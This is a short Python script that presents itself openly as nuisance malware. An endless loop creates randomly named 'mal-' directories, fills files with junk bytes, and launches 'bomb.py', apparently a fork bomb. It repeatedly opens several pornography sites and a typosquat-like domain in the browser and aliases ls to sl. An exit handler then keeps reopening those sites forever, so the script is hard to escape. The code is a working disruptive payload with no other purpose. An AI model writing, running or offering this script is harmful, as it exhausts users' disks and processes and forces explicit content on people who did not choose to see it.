import os
import atexit
import random
import time



def forked():
  mal = True 
  malwar = "m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̛̔́̉́̽̄́̌͆̎̎̀̚͘a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜a̵̧̨̼̦͇͕̅̏͛̈̾̑́̊́͘͘͝͝ͅl̸̨̢͍̥̼͙̻̰̹̂́̄̆̐̈́̑̇͘͟͜m̶̨̛̰͍̻͍̥̺̔́̉́̽̄́̌͆̎̎̀̚͘͜"
  randomlet = ["A", "a", "B", "b", "C", "c", "D", "d", "E", "e", "F", "f", "G", "g", "H", "h", "I", "i", "J", "j", "K", "k", "L", "l", "M","m", "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "S", "T", "t", "U", "u", "V", "v", "W", "x", "Y", "y", "Z", "z"]
  randonum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
  number = 1
  while mal == True:
    random1 = random.choice(randomlet)
    random2 = random.choice(randonum)
    random3 = random.choice(randonum)
    random4 = random.choice(randonum)
    os.system("clear")
    directory = "mal-" + random1 + str(random2) + str(random3) + str(random4)
    os.system("mkdir " + directory)
    os.system("touch " + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4))
    with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
      file.write(malwar + str(random.randbytes(999)))
    time.sleep(1)
    os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
    os.system("clear")
    if number == 1:
      os.system('alias ls="sl"')
      number = 0
    else:
      pass
    print(malwar)
    os.system("python bomb.py")

@atexit.register
def goodbye():
  mal = True
  while mal == True:
    os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
